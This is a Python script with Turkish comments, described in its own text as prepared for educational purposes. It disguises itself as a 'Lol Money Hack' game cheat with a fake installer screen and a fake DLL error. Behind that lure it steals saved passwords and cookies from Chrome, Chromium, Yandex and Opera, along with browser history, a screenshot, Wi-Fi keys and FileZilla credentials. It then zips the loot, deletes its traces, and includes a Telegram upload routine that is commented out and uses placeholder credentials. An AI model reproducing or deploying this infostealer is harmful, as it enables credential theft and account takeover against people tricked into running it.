#! -*- coding: utf-8 -*-
# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.
# @raifpy > Ömer Rai'ye Sonsuz Teşekkürler..

#-------------------------------------------------------------------------#
import tkinter                  # arayüz için
import urllib.request as req    # resim kodunu internetten çekebilmek için
import sys                      # dosya ismi|exit için
from time import sleep          # sleep() için
import platform                 # cihaz bilgileri için
from tkinter import messagebox  # Hata Mesajı için
#-------------------------------------------------------------------------#

### DataStealer ---------------------------------------------------------------------------------------------------------#
def DataStealer():
    # TelegramSend ve Zip İmha Pasif !!
    # Üretilen Dosyalara C:\Users\{kullanici_adi}\AppData\Roaming dizininde ulaşabilirsin
    import os                   # Dizinler ve dosyalarla çalışmak için
    import shutil               # Tarayıcı verilerini kopyalamak için
    import sqlite3              # Tarayıcıdan çekilen veritabanlarıyla çalışmak için
    import win32crypt           # Tarayıcıdan çekilen şifrelenmiş verileri çözmek için
    from PIL import ImageGrab   # Ekran görüntüsü almak için
    import subprocess           # WiFi işlemini Yakalamak için
    from lxml import etree      # FileZilla Dosyasını Okumak için
    import base64               # FileZilla'nın Şifrelenmiş verisini çözmek için.
    import re                   # Spesifik dosya seçebilmek için
    import zipfile              # Topladığımız verileri Zip'lemek için
    import requests             # Verileri Telegram apisi ile almak için

    kullanici_adi = os.getlogin()
    chrome_yolu = os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\'
    chromium_yolu = os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\'
    yandex_yolu = os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\'
    opera_yolu = os.getenv("LOCALAPPDATA") + '\\Opera Software\\Opera Stable\\'
    app_data = os.getenv("APPDATA") + '\\'
    filezilla_yolu = app_data + '\\FileZilla\\'
    txt_baslik = f"""@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!
    
    {kullanici_adi} İsimli Bilgisayarın"""

    def ChromePass():
        if os.path.exists(chrome_yolu + 'Login Data'):

            # DB'yi Kopyala
            shutil.copy2(chrome_yolu + 'Login Data', app_data + f'{kullanici_adi}_ChromeLoginData.sql')

            # Veri Tabanı Bağlantısı
            conn = sqlite3.connect(app_data + f'{kullanici_adi}_ChromeLoginData.sql')
            cursor = conn.cursor()

            # Dosya Oluştur Başlık Gir
            ust_bilgi = txt_baslik + '\n\n\t\t\tChrome Tarayıcı Şifreleri\n\n'
            file = open(app_data + f'{kullanici_adi}_ChromePass.txt', "w+")  #
            file.write(ust_bilgi)
            file.close()

            # Sonuçları getir
            gelen_veri = []
            cursor.execute('SELECT signon_realm, username_value, password_value FROM logins')
            for result in cursor.fetchall():
                # Login ve url Kolonları
                login = result[1]
                url = result[0]

                try:
                    password = win32crypt.CryptUnprotectData(result[2])[1].decode()
                    if login and url and password:
                        data = '=' * 100 + '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password + '\n' + '=' * 100
                        gelen_veri.append(data)
                except:
                    pass

            for sonuc in gelen_veri:
                file = open(app_data + f'{kullanici_adi}_ChromePass.txt', "a+")  #
                file.write(sonuc + '\n')
                file.close()

    def ChromeCookies():
        if os.path.exists(chrome_yolu + 'Cookies'):

            # DB'yi Kopyala
            shutil.copy2(chrome_yolu + 'Cookies', app_data + f'{kullanici_adi}_ChromeCookies.sql')

            # Veri Tabanı Bağlantısı
            conn = sqlite3.connect(app_data + f'{kullanici_adi}_ChromeCookies.sql')
            cursor = conn.cursor()

            # Dosya Oluştur Başlık Gir
            ust_bilgi = txt_baslik + '\n\n\t\t\tChrome Tarayıcı Çerezleri\n\n'
            file = open(app_data + f'{kullanici_adi}_ChromeCookies.txt', "w+")  #
            file.write(ust_bilgi)
            file.close()

            # Sonuçları getir
            gelen_veri = []
            cursor.execute('SELECT * from cookies')
            for result in cursor.fetchall():
                # url ve name Kolonları
                url = result[1]
                name = result[2]

                try:
                    cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
                    if url and name and cookie:
                        data = '=' * 100 + '\nURL: ' + url + '\nCOOKIE: ' + cookie + '\nCOOKIE NAME: ' + name + '\n' + '=' * 100
                        gelen_veri.append(data)
                except:
                    pass

            for sonuc in gelen_veri:
                file = open(app_data + f'{kullanici_adi}_ChromeCookies.txt', "a+")  #
                file.write(sonuc + '\n')
                file.close()

    def ChromeDownloadHistory():
        if os.path.exists(chrome_yolu + 'History'):

            # DB'yi Kopyala
            shutil.copy2(chrome_yolu + 'History', app_data + f'{kullanici_adi}_ChromeHistory.sql')

            # Veri Tabanı Bağlantısı
            conn = sqlite3.connect(app_data + f'{kullanici_adi}_ChromeHistory.sql')
            cursor = conn.cursor()

            # Dosya Oluştur Başlık Gir
            ust_bilgi = txt_baslik + '\n\n\t\t\tChrome Tarayıcı İndirme Geçmişi\n\n'
            file = open(app_data + f'{kullanici_adi}_ChromeDownloadHistory.txt', "w+")  #
            file.write(ust_bilgi)
            file.close()

            # Sonuçları getir
            gelen_veri = []
            cursor.execute('SELECT current_path, tab_url from downloads')
            for result in cursor.fetchall():
                # dizin ve url Kolonları
                dizin = result[0]
                url = result[1]

                try:
                    if dizin and url:
                        data = '=' * 100 + '\nDizin: ' + dizin + '\nURL: ' + url + '\n' + '=' * 100
                        gelen_veri.append(data)
                except:
                    pass

            for sonuc in gelen_veri:
                file = open(app_data + f'{kullanici_adi}_ChromeDownloadHistory.txt', "a+")  #
                file.write(sonuc + '\n')
                file.close()

    def ChromeURLHistory():
        if os.path.exists(chrome_yolu + 'History'):

            # DB'yi Kopyala
            shutil.copy2(chrome_yolu + 'History', app_data + f'{kullanici_adi}_ChromeHistory.sql')

            # Veri Tabanı Bağlantısı
            conn = sqlite3.connect(app_data + f'{kullanici_adi}_ChromeHistory.sql')
            cursor = conn.cursor()

            # Dosya Oluştur Başlık Gir
            ust_bilgi = txt_baslik + '\n\n\t\t\tChrome Tarayıcı url Geçmişi\n\n'
            file = open(app_data + f'{kullanici_adi}_ChromeURLHistory.txt', "w+")  #
            file.write(ust_bilgi)
            file.close()

            # Sonuçları getir
            gelen_veri = []
            cursor.execute('SELECT title, url from urls')
            for result in cursor.fetchall():
                # baslik ve url Kolonları
                baslik = result[0]
                url = result[1]

                try:
                    if baslik and url:
                        data = '=' * 100 + '\nBaşlık: ' + baslik + '\nURL: ' + url + '\n' + '=' * 100
                        gelen_veri.append(data)
                except:
                    pass

            for sonuc in gelen_veri:
                try:
                    file = open(app_data + f'{kullanici_adi}_ChromeURLHistory.txt', "a+")  #
                    file.write(sonuc + '\n')
                    file.close()
                except:
                    pass

    def ScreenShot():
        screen = ImageGrab.grab()
        screen.save(app_data + f'{kullanici_adi}_ScreenShot.jpg')

    def WiFiPass():
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'
                                        ]).decode('utf-8', errors="backslashreplace").split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

        # Dosya Oluştur Başlık Gir
        ust_bilgi = txt_baslik + '\n\n\t\t\tWiFi Şifreleri\n\n'
        file = open(app_data + f'{kullanici_adi}_WifiPass.txt', "w+")  #
        file.write(ust_bilgi + '=' * 100)
        file.close()

        for i in profiles:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'
                                                   ]).decode('utf-8', errors="backslashreplace").split('\n')
                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                try:
                    sonuc = "{:<30}|  {:<}".format(i, results[0])
                    file = open(app_data + f'{kullanici_adi}_WifiPass.txt', "a+")  #
                    cikti = '\n' + sonuc + '\n' + '=' * 100
                    file.write(cikti)
                    file.close()
                except IndexError:
                    sonuc = "{:<30}|  {:<}".format(i, "")
                    file = open(app_data + f'{kullanici_adi}_WifiPass.txt', "a+")  #
                    cikti = '\n' + sonuc + '\n' + '=' * 100
                    file.write(cikti)
                    file.close()
            except subprocess.CalledProcessError:
                sonuc = "{:<30}|  {:<}".format(i, "ENCODING ERROR")
                file = open(app_data + f'{kullanici_adi}_WifiPass.txt', "a+")  #
                cikti = '\n' + sonuc + '\n' + '=' * 100
                file.write(cikti)
                file.close()

    def ChromiumPass():
        if os.path.exists(chromium_yolu + 'Login Data'):

            # DB'yi Kopyala
            shutil.copy2(chromium_yolu + 'Login Data', app_data + f'{kullanici_adi}_ChromiumLoginData.sql')

            # Veri Tabanı Bağlantısı
            conn = sqlite3.connect(app_data + f'{kullanici_adi}_ChromiumLoginData.sql')
            cursor = conn.cursor()

            # Dosya Oluştur Başlık Gir
            ust_bilgi = txt_baslik + '\n\n\t\t\tChromium Tarayıcı Şifreleri\n\n'
            file = open(app_data + f'{kullanici_adi}_ChromiumPass.txt', "w+")  #
            file.write(ust_bilgi)
            file.close()

            # Sonuçları getir
            gelen_veri = []
            cursor.execute('SELECT signon_realm, username_value, password_value FROM logins')
            for result in cursor.fetchall():
                # Login ve url Kolonları
                login = result[1]
                url = result[0]

                try:
                    password = win32crypt.CryptUnprotectData(result[2])[1].decode()
                    if login and url and password:
                        data = '=' * 100 + '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password + '\n' + '=' * 100
                        gelen_veri.append(data)
                except:
                    pass

            for sonuc in gelen_veri:
                file = open(app_data + f'{kullanici_adi}_ChromiumPass.txt', "a+")  #
                file.write(sonuc + '\n')
                file.close()

    def YandexPass():
        if os.path.exists(yandex_yolu + 'Ya Login Data.db'):

            # DB'yi Kopyala
            shutil.copy2(yandex_yolu + 'Ya Login Data.db', app_data + f'{kullanici_adi}_YandexLoginData.db')

            # Veri Tabanı Bağlantısı
            conn = sqlite3.connect(app_data + f'{kullanici_adi}_YandexLoginData.db')
            cursor = conn.cursor()

            # Dosya Oluştur Başlık Gir
            ust_bilgi = txt_baslik + '\n\n\t\t\tYandex Tarayıcı Şifreleri\n\n'
            file = open(app_data + f'{kullanici_adi}_YandexPass.txt', "w+")  #
            file.write(ust_bilgi)
            file.close()

            # Sonuçları getir
            gelen_veri = []
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            for result in cursor.fetchall():
                # Login ve url Kolonları
                login = result[1]
                url = result[0]

                try:
                    password = win32crypt.CryptUnprotectData(result[2])[1].decode()
                    if login and url and password:
                        data = '=' * 100 + '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password + '\n' + '=' * 100
                        gelen_veri.append(data)
                except:
                    pass

            for sonuc in gelen_veri:
                file = open(app_data + f'{kullanici_adi}_YandexPass.txt', "a+")  #
                file.write(sonuc + '\n')
                file.close()

    def OperaPass():
        if os.path.exists(opera_yolu + 'Login Data'):

            # DB'yi Kopyala
            shutil.copy2(opera_yolu + 'Login Data', app_data + f'{kullanici_adi}_OperaLoginData.sql')

            # Veri Tabanı Bağlantısı
            conn = sqlite3.connect(app_data + f'{kullanici_adi}_OperaLoginData.sql')
            cursor = conn.cursor()

            # Dosya Oluştur Başlık Gir
            ust_bilgi = txt_baslik + '\n\n\t\t\tOpera Tarayıcı Şifreleri\n\n'
            file = open(app_data + f'{kullanici_adi}_OperaPass.txt', "w+")  #
            file.write(ust_bilgi)
            file.close()

            # Sonuçları getir
            gelen_veri = []
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            for result in cursor.fetchall():
                # Login ve url Kolonları
                login = result[1]
                url = result[0]

                try:
                    password = win32crypt.CryptUnprotectData(result[2])[1].decode()
                    if login and url and password:
                        data = '=' * 100 + '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password + '\n' + '=' * 100
                        gelen_veri.append(data)
                except:
                    pass

            for sonuc in gelen_veri:
                file = open(app_data + f'{kullanici_adi}_OperaPass.txt', "a+")  #
                file.write(sonuc + '\n')
                file.close()

    def FileZillaPass():
        if os.path.isfile(filezilla_yolu + 'recentservers.xml') is True:
            root = etree.parse(filezilla_yolu + 'recentservers.xml').getroot()

            # Dosya Oluştur Başlık Gir
            ust_bilgi = txt_baslik + '\n\n\t\t\tFileZilla Şifreleri\n\n'
            file = open(app_data + f'{kullanici_adi}_FileZillaPass.txt', "w+")  #
            file.write(ust_bilgi)
            file.close()

            # Sonuçları getir
            gelen_veri = []
            for i in range(len(root[0])):
                host = root[0][i][0].text
                port = root[0][i][1].text
                user = root[0][i][4].text
                try:
                    password = base64.b64decode(root[0][i][5].text).decode('utf-8')
                    if host and user and password:
                        data = '=' * 100 + '\nhost: ' + host + '\nport: ' + port + '\nuser: ' + user + '\npass: ' + password + '\n' + '=' * 100
                        gelen_veri.append(data)
                except:
                    pass
            for sonuc in gelen_veri:
                file = open(app_data + f'{kullanici_adi}_FileZillaPass.txt', "a+")  #
                file.write(sonuc + '\n')
                file.close()


    ChromePass()
    ChromeCookies()
    ChromeDownloadHistory()
    ChromeURLHistory()
    ScreenShot()
    WiFiPass()
    ChromiumPass()
    YandexPass()
    OperaPass()
    FileZillaPass()

    def ZipFile():
        zip_adi = app_data + f'{kullanici_adi}_LOG.zip'
        yeni_zip = zipfile.ZipFile(zip_adi, 'w')
        
        dosyalar = os.listdir(app_data)
        for i in dosyalar:
            if re.match(f"{kullanici_adi}*.*txt",i) or \
                    re.match(f"{kullanici_adi}*.*jpg",i):
                yeni_zip.write(app_data + i)
                
        yeni_zip.close()
    ZipFile()

    def DosyaYokEt():
        dosyalar = os.listdir(app_data)
        for i in dosyalar:
            if re.match(f"{kullanici_adi}*.*txt",i) or \
                    re.match(f"{kullanici_adi}*.*jpg",i) or \
                    re.match(f"{kullanici_adi}*.*sql",i) or \
                    re.match(f"{kullanici_adi}*.*db",i):
                os.remove(app_data + i)
    DosyaYokEt()

    def TelegramSend():
        loglar = {'document': open(app_data + f'{kullanici_adi}_LOG.zip', 'rb')}
        bot_token = "XXXXXXXXXX:XXXXXX"
        chat_id = "XXXXXXX"
        requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id, files=loglar)
    #TelegramSend()

    #os.remove(app_data + f'{kullanici_adi}_LOG.zip')
### DataStealer ---------------------------------------------------------------------------------------------------------#

### Tkinter Arayüz ------------------------------------------------------------------------------------------------------#
def Muamele():  # Muamele Fonksiyonumuz
    from random import uniform  # sleep'lere random değer atamak için

    liste = ['bağlantı kuruluyor',
             'cpu cevabı.bekleniyor',
             'default klasör aranıyor',
             'bulundu !',
             'patch dosyası oluşturuluyor',
             'patch dosyası doğrulanıyor',
             'doğrulama başarılı',
             'patch indiriliyor',
             'patch indiriliyor',
             'indirme başarılı',
             'doğrulanıyor',
             'patch içeriği okunuyor',
             'yamalanıyor',
             'kuruluyor',
             'yüklemeye hazırlanıyor',
             'internet bağlantısı kontrol ediliyor',
             'kablolar koklanıyor']

    for i in liste:
        label.config(text=i)
        app.update()
        sleep(0.1)

    def Processing():
        from tqdm import tqdm  # Terminalde progress bar oluşturmak için

        pbar = tqdm(list(liste)[::-1])
        for i in pbar:
            pbar.set_description(f'Processing >> {i}')
            label["text"] = f"{i}"
            app.update()
            sleep(0.1)

    Processing()

    for i in range(100):
        label["text"] = f"Kuruluyor  %{str(i)}"
        app.update()
        sleep(uniform(0, 0.17))
    sleep(2)

#----------------------------------------------------------------------------------------------------------------------#
app = tkinter.Tk()  # tkinter penceremizi açtık

#image = tkinter.PhotoImage(data="""iVBORw0KGgo <BASE64 Kodu(2500+ Satır)> 8coAAAAASUVORK5CYII=""")

######## veya
image = tkinter.PhotoImage(data=req.urlopen(
    "https://raw.githubusercontent.com/keyiflerolsun/Depo/master/Python/05_Tkinter/lol.png.txt"
                                                ).read())

######## veya
#with open("lol.png.txt", "rb") as base64_png:
#    image = tkinter.PhotoImage(data=base64_png.read())

app.iconphoto(False, image)     # Pencere ikonu (Görünmeyecek)
app.title("Lol Money Hack")     # Pencere Başlığı (Görünmeyecek)
app.wm_overrideredirect(True)   # Başlık-Kapat-Küçült Tuşlarının olduğu kısmı kaldırıyoruz
app.attributes("-alpha", 0.9)   # Penceremize hafif şeffaflık katıyoruz
app.resizable(0, 0)             # Yeniden boyutlandırmayı kapattık

windowWidth = app.winfo_reqwidth()                                      # Penceremizin enlemini aldık
windowHeight = app.winfo_reqheight()                                    # Penceremizin boylamını aldık
positionRight = int(app.winfo_screenwidth() / 2.5 - windowWidth / 2)    # Pencere konumumuzun enlemini değiştiriyoruz
positionDown = int(app.winfo_screenheight() / 2.5 - windowHeight / 2)   # Pencere konumumuzun boylamını değiştiriyoruz
app.geometry(f"+{positionRight}+{positionDown}")                        # Pencere konumumuz ayarlıyoruz
    # NOT # positionRight ve positionDown 'da pencereyi ortalarken "2.5" rakamında değişiklik yapmanız gerekebilir

label = tkinter.Label(image=image,
                      text=" ",
                      compound="top",
                      bg="black",
                      fg="white",
                      cursor="watch")   # label'ı ayarladık
label.pack()                            # label'imizi görünür yaptık
app.update()                            # Tkinter'a tüm ayarları yaptığımızı söyledik.
                                        # Böylece sleep verdiğimiz zaman ekrandaki herşeyi gösterip sonra bekleyecek.
                                        # Aksi türlü ilk sleep()'i bekliyor ardından uygulamamızı açıyor .
#----------------------------------------------------------------------------------------------------------------------#

#------------------------------------------ # Başladık
sleep(3)                                    # Arkadaşımızı azıcık bekletelim değil mi :) +knk az bekle yüklenir şimdi

#--------------------------------------------------------------------------------------------------------------#
label.config(text="Searching LOL Files ..") # 3 saniye bekledikten sonra
                                            # daha önce " " olarak verdiğimiz değere birkaç şeyler yazalım
                                            # Yabancı dil kullanarak "+ adamlar yapmış bee" dedirtebilirsiniz .)
app.update()                                # Tekrardan güncelleme vermek zorundayız
sleep(3)                                    # "Searching LOL Files .." :)
#--------------------------------------------------------------------------------------------------------------#

#--------------------------------------------------------------------------------------------------------------#
label["text"] = "Searching LOL Account"     # label.config() yapmak yerine label[]'de kullanabilirsiniz .
app.update()                                # Tekrardan güncelliyoruz
DataStealer()                               # DataStealer Fonksiyonumuzu Çağırdık
#--------------------------------------------------------------------------------------------------------------#

#--------------------------------------------------------------------------------------------------------------#
Muamele()                                   # Muamele Fonksiyonumuzu Çağırdık
sleep(2)                                    # 2 Saniye bekletip hatamızı çakalım :)
#------------------------------------------ # Bitirdik

messagebox.showerror("LOL Money Hack", "Id1oT.dll not found !")  # :) .dll bulunamadı adında bir hata çıkarttık

sys.exit()      # Hata ekranı geçildikten sonra tüm uygulamamızı kapattık

app.mainloop()  # penceremizi aktif ettik
